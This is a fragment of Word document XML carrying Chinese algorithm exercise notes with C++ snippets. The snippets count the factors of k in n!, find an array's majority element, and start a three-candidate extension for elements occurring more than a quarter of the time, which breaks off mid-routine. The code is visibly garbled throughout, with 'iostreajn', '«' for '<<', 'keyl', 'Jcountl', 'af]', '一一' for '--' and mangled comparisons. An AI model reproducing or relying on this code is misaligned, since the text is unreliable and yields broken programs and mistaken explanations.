        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="bookmark13"/>
      <w:bookmarkEnd w:id="11"/>
      <w:bookmarkStart w:id="12" w:name="bookmark11"/>
      <w:bookmarkStart w:id="13" w:name="bookmark12"/>
      <w:bookmarkStart w:id="14" w:name="bookmark14"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>数组中有三个数字出现超过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1/4,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>求这三个数字?</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
      <w:bookmarkEnd w:id="13"/>
      <w:bookmarkEnd w:id="14"/>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include &lt;iostream&gt;</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r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>求</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>因数的个数。</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int Grial(int x, int k)</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int Ret = 0;</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while (x)</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Ret += x / k;</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x /= k;</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return Ret;</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cout « Grial(10, 2) « endl;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="720" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="82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en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>假设要求一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>n!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的因子个数，那么必然满足例如以下的规则。</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">/用卩 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>x=n/k+n/k'2+n/k'3...</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">(直到 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">n/k'x </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>小于 0);</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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include &lt;iostreajn&gt;</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int Grial(int x, int k)</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 xml:space="preserve">int count </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>0;</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int n = x;</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while (n)</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n &amp;= (n - 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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count++;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 xml:space="preserve">return x </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">一 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>count;</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cout « Grial(3, 2) « endl;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="980" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="82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0" w:line="285" w:lineRule="exact"/>
        <w:ind w:left="420" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>找出数组中出现次数超过数组一半的数字</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">。 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>include &lt;iostreajn&gt;</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line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int Grial(int a[], int n)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>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int count=0;</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key;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="820"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (int i = 0; i &lt; n; i++)</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if (count == 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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315" w:lineRule="exact"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>key = a[i]; count = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="315"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else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (key == a[i])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="16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00" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2100" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>count++;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="400" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1660" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="2100" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>count</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>一一</w:t>
      </w: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00" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="840"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return key;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="42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00" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="both"/>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after="0" w:line="300" w:lineRule="exact"/>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int a[] = {1, 2, 3,4, 5,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>6,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3, 3, 3, 3, 3};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="840" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">cout«Grial (a, sizeof (a) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">/ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>sizeof (int)) «endl; return 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="320" w:line="300" w:lineRule="exact"/>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0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>#include &lt;iostreajn&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>上一題的扩展，有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>个数字出现次数超过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>1/4。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="42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100" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="420"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>void Grial(int af], int n)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>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if (n &lt;= 3)return;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int count1=0, key1=0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int count2=0, key2=0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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int count3=0, key3=0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="840"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (int i = 0; i &lt; n; i++)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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30" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="20"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>if (Jcountl &amp;&amp; key2 != a[i] &amp;&amp; key3 != a[i]) [</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>count1++;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>keyl = a[i];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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00" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>else if (keyl == a[i])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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00" w:lineRule="exact"/>
        <w:ind w:left="1680" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>count1++;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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00" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>else if (key2J=a[i] &amp;&amp; key3J=a[i])</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count1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>一一</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="640" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="12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00" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="1260" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
